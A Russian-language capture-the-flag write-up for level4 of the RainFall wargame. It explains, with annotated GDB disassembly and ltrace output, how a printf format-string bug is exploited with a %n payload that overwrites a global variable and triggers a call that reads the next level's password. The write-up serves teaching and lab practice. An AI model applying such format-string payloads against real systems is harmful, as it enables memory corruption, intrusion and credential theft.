# Решение
echo -ne $'\x10\x98\x04\x08%16930112x%12$n' | ./level4
0f99***56a

# Объяснение

1. Анализируем поведение программы
level4@RainFall:~$ ./level4
asd
asd
level4@RainFall:~$ ./level4
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Принимает символы на стандартный ввод и выводит их на стандартный вывод.
Буффер не переполняется.

2. ltrace
level4@RainFall:~$ ltrace ./level4
__libc_start_main(0x80484a7, 1, 0xbffff6f4, 0x80484c0, 0x8048530 <unfinished ...>
fgets(A
"A\n", 512, 0xb7fd1ac0)                            = 0xbffff440
printf("A\n"A
)                                            = 2
+++ exited (status 0) +++

Как видим, используется защищенная версия gets - fgets. Которая имеет ограничение по считываемым символам.
Затем, введенная нами последовательность символов выводится через принтф, помещаясь в управляющую строку - небезопасно.

3. GDB
(gdb) disas main
Из интересного, только вызов функции n.
   0x080484ad <+6>:	call   0x8048457 <n>


(gdb) disas n

   0x08048457 <+0>:	    push   %ebp                   // пролог
   0x08048458 <+1>:	    mov    %esp,%ebp
   0x0804845a <+3>:	    sub    $0x218,%esp            // резервируем в стеке 536 байт
   0x08048460 <+9>:	    mov    0x8049804,%eax         // адрес stdin помещается в регистр EAX (x/1cb 0x8049804)
   0x08048465 <+14>:	mov    %eax,0x8(%esp)         // помещаем адрес stdin из регистра EAX в стек (арг 3)
   0x08048469 <+18>:	movl   $0x200,0x4(%esp)       // помещаем в стек значение 512 (арг 2)
   0x08048471 <+26>:	lea    -0x208(%ebp),%eax      // кладем в адрес, лежащий в EBP, -520 в регистр EAX (адрес буфера)
   0x08048477 <+32>:	mov    %eax,(%esp)            // кладем адрес буфера из регистра EAX на вершину стека (арг 1)
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>  // вызываем fgets с 3 аргументами, указанными выше
   0x0804847f <+40>:	lea    -0x208(%ebp),%eax      // кладем адрес буфера в регистр EAX
   0x08048485 <+46>:	mov    %eax,(%esp)            // кладем адрес буфера на вершину стека (арг 1)
   0x08048488 <+49>:	call   0x8048444 <p>          // вызываем функцию p с аргументом, указанным выше.
   0x0804848d <+54>:	mov    0x8049810,%eax         // кладем адрес глобальной переменной <m> в регистр EAX
   0x08048492 <+59>:	cmp    $0x1025544,%eax        // сравниваем значение 16930116 с значением глоб. переменной <m>
   0x08048497 <+64>:	jne    0x80484a5 <n+78>       // если значения не совпали, переходим к окончанию функции
   0x08048499 <+66>:	movl   $0x8048590,(%esp)      // кладем адресс строки "/bin/cat /home/user/level5/.pass" (x/33cb 0x8048590)
   0x080484a0 <+73>:	call   0x8048360 <system@plt> // вызываем system с аргументом "/bin/cat /home/user/level5/.pass"
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret

В функции n мы обнаруживаем считывание данных в буфер<+35>, вызов функции p<+49> и, крайне важное для нас,
вызов функции system<+73> с аргументом "/bin/cat /home/user/level5/.pass". Однако, данный вызов ограничен
проверкой<+59> на равенство глобальной переменной m<0x08049810> с десятичным значением 16930116.


(gdb) disas p
   0x08048444 <+0>:	    push   %ebp                   // пролог
   0x08048445 <+1>:	    mov    %esp,%ebp
   0x08048447 <+3>:	    sub    $0x18,%esp             // выделяем 24 байта на стеке
   0x0804844a <+6>:	    mov    0x8(%ebp),%eax         // кладем значение адреса в регистре EBP + 8 в регистр EAX
   0x0804844d <+9>:	    mov    %eax,(%esp)            // кладем значение регистра EAX на вершину стека. (Буфер из функции n)
   0x08048450 <+12>:	call   0x8048340 <printf@plt> // вызываем printf с аргументом. Аргумент - буфер.
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret

Функция p просто печатает строку, записанную в буфер, через printf.
Как и в прошлом задании, тут ,введенная нами строка, передается как управляющая в printf, что является уязвимостью.

4. Взлом.
Итак, задача - подменить значение глобальной переменной m<0x08049810> на 16930116.

Сначала найдем, каким аргументом printf будет первые 4 байта, введенной нами строки.
level4@RainFall:~$ python -c 'print "AAAA" + "%x " * 15' | ./level4
AAAAb7ff26b0 bffff684 b7fd0ff4 0 0 bffff648 804848d bffff440 200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520

Это 12 аргумент - 41414141.

Теперь подготовим эксплойт.
level4@RainFall:~$ echo -ne $'\x10\x98\x04\x08%16930112x%12$n' | ./level4

\x10\x98\x04\x08 - адрес переменной m в порядке байт от меньшего к большему (little-endian).
%16930112x - вывод первого вргумента в 16-ном виде с общей шириной 16930112. (16930116 - 4 байта адреса переменной m).
    Необходимо, чтобы было выведено 16930116 символов.
%12$n - запись количества выведенных символов по алресу, указанному как 12 аргумент.